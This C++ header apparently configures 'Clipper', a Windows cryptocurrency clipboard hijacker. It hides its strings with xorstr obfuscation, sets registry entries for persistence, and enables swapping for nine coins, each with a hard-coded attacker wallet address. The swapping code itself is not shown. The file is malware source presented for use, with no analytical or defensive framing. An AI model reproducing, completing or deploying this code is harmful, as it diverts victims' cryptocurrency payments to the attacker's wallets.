#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <exception>
#include <iostream>
#include <ostream>
#include <stdexcept>
#include <string>
#include <windows.h>
#include <chrono>
#include <thread>
#include <shlobj.h>
#include <exception>
#include <typeinfo>
#include <stdexcept>
#include <ctime>
#include <filesystem>
#include <regex>

#include "xorstr.h"

/* Registry Settings */
std::string path = xorstr("Clipper");
std::string name = xorstr("Clipper");
std::string exe = xorstr("Clipper.exe");

/* Program Settings */
bool debugging = true;

bool m_btc = true;
bool m_ltc = true;
bool m_xmr = true;
bool m_eth = true;
bool m_xrp = true;
bool m_neo = true;
bool m_bch = true;
bool m_doge = true;
bool m_dash = true;

std::string btc = xorstr("bc1qptlaq3jx4ysfxwhp09rc22yyh8ncm6eew7c4qq");
std::string ltc = xorstr("ltc1qxpsuma67n4hvznwvdj3l7w98t2kygvy92e0ayw");
std::string xmr = xorstr("48KaR8HAxxKe23LWgwpqnW4WXuPyNhwhVginioqJSyvUBhc5ye4kYJ6bdQDFcNxU9zdixGWvhiU9bNg9oDgVPpjYSFEpSmS");
std::string eth = xorstr("0xf8B9e54C66a8Ac253F375cC05cE7aB0ddA516dc1");
std::string xrp = xorstr("rJ9ejaRhAr5itomU7j32NT9LVN3dzaLjwo");
std::string neo = xorstr("ARC8a9Xh9dEZdfj9qv9cYYqHS5GgUYoZhB");
std::string bch = xorstr("qz8z00gyg2n9w2xf03terr4760078nv3kge00ujn6d");
std::string doge = xorstr("DCEe9g1V1ou3rS5yVtYQABanUUpVBVsww8");
std::string dash = xorstr("Xj2RYtyYVfgGoKSarMYpLRf24sdBAyF68m");
